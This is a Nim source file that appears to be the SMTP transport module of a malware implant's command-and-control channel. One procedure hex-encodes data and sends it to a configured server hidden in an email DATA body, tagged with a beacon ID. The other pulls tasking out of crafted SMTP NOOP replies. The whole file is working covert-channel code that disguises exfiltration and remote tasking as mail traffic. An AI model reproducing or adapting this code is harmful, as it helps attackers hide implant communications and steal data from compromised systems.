import ../[config, utils, meta]
import std/[strutils, random, strformat, base64, os, endians, net]

proc send_request_smtp_post*(data: seq[byte], prefix: string): seq[byte] =
    var socket = dial(config.host, parseInt(config.port).Port)
    var resp = socket.recvLine()
    if not resp.startsWith("220"):
        dbg "[-] failed to connect to server, resp: " & resp
        return 

    socket.send(&"HELO {smtp_client_name}\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("250"):
        dbg "[-] failed to send HELO command, resp: " & resp
        return

    socket.send(&"MAIL FROM: <{beacon_id.toHex(8)}@{smtp_from_base_domain}>\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("250"):
        dbg "[-] failed to send MAIL FROM command, resp: " & resp
        return

    socket.send(&"RCPT TO: <{smtp_to_user}>\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("250"):
        dbg "[-] failed to send RCPT TO command, resp: " & resp
        return

    socket.send(&"DATA\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("354"):
        dbg "[-] failed to send DATA command, resp: " & resp
        return

    socket.send(smtp_data_prefix & prefix & data.toString.toHex & smtp_data_suffix & "\r\n.\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("250"):
        dbg "[-] failed to send DATA command, resp: " & resp
        return

    socket.send(&"QUIT\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("221"):
        dbg "[-] failed to send QUIT command, resp: " & resp
        return
    socket.close()
    return

proc send_request_smtp_get*(data: seq[byte]): seq[byte] =
    var socket = dial(config.host, parseInt(config.port).Port)
    var resp = socket.recvLine()
    if not resp.startsWith("220"):
        dbg "[-] failed to connect to server, resp: " & resp
        return 

    socket.send(&"HELO {smtp_client_name}\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("250"):
        dbg "[-] failed to send HELO command, resp: " & resp
        return

    socket.send(&"MAIL FROM: <{beacon_id.toHex(8)}@{smtp_from_base_domain}>\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("250"):
        dbg "[-] failed to send MAIL FROM command, resp: " & resp
        return

    socket.send(&"RCPT TO: <{smtp_to_user}>\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("250"):
        dbg "[-] failed to send RCPT TO command, resp: " & resp
        return

    var res_str = ""
    while true:
        socket.send(&"NOOP\r\n")
        resp = socket.recvLine()
        if resp == smtp_noop_empty_response:
            break
        else:
            resp.removePrefix("250 ")
            resp.removePrefix(smtp_noop_prefix)
            resp.removeSuffix(smtp_noop_suffix)
            res_str = res_str & resp
            dbg "[*] recv NOOP response: " & resp
    result = parseHexStr(res_str).toSeq
    dbg "[*] recv task bytes: " & $result

    socket.send(&"DATA\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("354"):
        dbg "[-] failed to send DATA command, resp: " & resp
        return

    socket.send(smtp_data_prefix & smtp_empty_data & smtp_data_suffix & "\r\n.\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("250"):
        dbg "[-] failed to send DATA command, resp: " & resp
        return

    socket.send(&"QUIT\r\n")
    resp = socket.recvLine()
    if not resp.startsWith("221"):
        dbg "[-] failed to send QUIT command, resp: " & resp
        return
    socket.close()
    return